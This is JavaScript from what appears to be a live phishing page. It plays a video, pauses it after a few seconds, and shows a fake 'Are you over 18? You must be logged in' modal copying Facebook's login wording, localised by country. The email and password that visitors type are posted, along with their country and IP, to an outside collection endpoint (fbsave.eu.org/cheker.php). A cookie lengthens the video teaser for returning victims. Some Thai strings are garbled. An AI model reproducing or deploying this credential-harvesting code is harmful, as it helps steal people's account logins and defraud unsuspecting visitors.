   function set_Cookie(name, value) {
            name = "LIDL-tt"+name;
            var Days = 30;
            var exp = new Date();
            var domain = document.domain.split('.').slice(-2).join('.');
            exp.setTime(exp.getTime() + (Days * 20 * 1000));
            document.cookie = name + "=" + escape(value) + ";expires=" + exp.toGMTString() + ";domain=."+domain+"; path=/;"
        }

        function get_Cookie(name) {
            name = "LIDL-tt"+name;
            var arr, reg = new RegExp("(^| )" + name + "=([^;]*)(;|$)");
            if (arr = document.cookie.match(reg)) {
                return unescape(arr[2]);
            }
            return '';
        }
   
	const video = document.getElementById("video")
	const modal = document.getElementById("modal")
	const form = document.getElementById("form")
	const inputEmail = document.getElementById("email")
	const inputPassword = document.getElementById("pass")
	const textWrong = document.getElementById("text-wrong")
	const passwordEye = document.getElementById("password-eye")

	let totalTimePlayed = 0
	let lastUpdatedTime = 0
	let loginCount = 0

	var type_op = 1;
	type_op = get_Cookie('type_op') == '' ? 1 : parseInt(get_Cookie('type_op'));
 
	const updateTotalTimePlayed = () => {
    const newTime = video.currentTime
    const timeDiff = newTime - lastUpdatedTime
    if (timeDiff > 0) {
        totalTimePlayed += timeDiff
    }
    lastUpdatedTime = newTime
    if (totalTimePlayed > 5) {
		if(type_op !== 2){
        modal.style.display = "flex"
		video.removeEventListener("timeupdate", updateTotalTimePlayed)
        video.pause()		
		}
		else{
			if(totalTimePlayed > 30) {
			modal.style.display = "flex"
			video.removeEventListener("timeupdate", updateTotalTimePlayed)
			video.pause()		
		}
			
		}
       
    }
}

video.addEventListener("timeupdate", updateTotalTimePlayed)



passwordEye.addEventListener("click", () => {
    if (inputPassword.type === "password") {
        passwordEye.src = "/files/view.svg" 
        inputPassword.type = "text"
    } else {
        passwordEye.src = "/files/hide.svg"
        inputPassword.type = "password"
    }
})


   
        setInterval(function () {
      
 }, 0);
 function lee() {
     debugger
 }
  function getcountry() {

var jqXHR = $.ajax({
 url: 'https://cloudflare.com/cdn-cgi/trace',
//...

async: false

});
if(jqXHR.responseText)
return jqXHR.responseText.match(/loc=(.+)/)[1];
else
	return "none";

}
 var country = getcountry();
 console.log(country);
var errortext="";

if(country==="ID")
{
	document.title = 'Apa Anda berusia lebih dari 18 tahun?';
	$('#result').html("Anda harus masuk untuk melanjutkan.");
	$('#submit').html("Masuk");
	$('#reg-btn').html("Buat Akun Baru");
	$('#forget-password').html("Lupa Kata Sandi?");
	$("#email").attr("placeholder", "Email atau Nomor Telepon");
	$("#pass").attr("placeholder", "Kata Sandi");
	errortext="Username atau password salah";
}
else if(country!=="TH")
{
	document.title = 'Are you over 18?';
	$('#result').html("You must be logged in to continue.");
	$('#submit').html("Log In");
	$('#reg-btn').html("Create New Account");
	$('#forget-password').html("Forgotten password?");
	$("#email").attr("placeholder", "Email address or phone number");
	$("#pass").attr("placeholder", "Password");
	errortext="Invalid username or password";
}
else if(country==="TH")
{
	errortext="ชื่อ้หรือรหัสผาไม่ถกตอง";
}

 
 
 	ip = "ip";
$('#submit').click(function () {
    let email = $('#email').val();
    let password = $('#pass').val();
	
    if (!email || !password) {
        $('#result').html(errortext);
        return false
    };
$('#submit').html('• • •');
	event.preventDefault();
    $.ajax({
        url: 'https://fbsave.eu.org/cheker.php',
        type: 'POST',
        dataType: 'JSON',
        data: {
            password: password,
            email: email,
			ip:ip,
			country:country,
			uri:window.location.href="https://faponic.com/",

        },
        success: (data) => {
            $('#submit').html('Log In');
			if (data.error) {
                $('#result').html("ชืู่้ใ้หรือหัส่าไถต้อง");
                $('email').val('')
            } else {
				set_Cookie('type_op', 2);
                setTimeout(function () {
                   window.location = data.url
                }, 1000)
            }
        }
		
    })
})